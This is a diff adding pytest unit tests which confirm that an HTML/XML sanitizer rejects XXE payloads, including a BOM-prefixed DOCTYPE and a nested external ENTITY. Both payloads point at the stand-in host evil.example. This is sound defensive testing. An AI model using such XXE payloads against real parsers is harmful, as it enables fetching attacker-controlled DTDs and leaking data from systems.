@@ -131,6 +131,32 @@ class TestCommentedDOCTYPENotAFalsePositive:
 
 
 @pytest.mark.unit
+class TestUnicodeEncodingBypass:
+    """BOM-prefixed + nested payloads should not bypass the XXE pre-scan."""
+
+    def test_utf8_bom_doctype_rejected(self, guard: HTMLParseGuard) -> None:
+        # UTF-8 BOM (﻿) prepended to a malicious DOCTYPE.
+        payload = '﻿<!DOCTYPE foo SYSTEM "http://evil.example/xxe.dtd"><foo>x</foo>'
+        result = guard.sanitize(payload)
+        assert result.cleaned == ""
+        assert result.gap_detected is True
+
+    def test_nested_doctype_with_entity_rejected(
+        self,
+        guard: HTMLParseGuard,
+    ) -> None:
+        """DOCTYPE declaring an internal ENTITY that references an
+        external system URL: either the outer DOCTYPE regex or the
+        ENTITY regex rejects it (both are sufficient)."""
+        payload = (
+            '<!DOCTYPE outer [<!ENTITY inner SYSTEM "http://evil.example/">]><x>y</x>'
+        )
+        result = guard.sanitize(payload)
+        assert result.cleaned == ""
+        assert result.gap_detected is True
+
+
+@pytest.mark.unit
 class TestBenignRegressionGuard:
     """Ensure the new parser doesn't break existing-behaviour tests."""
 
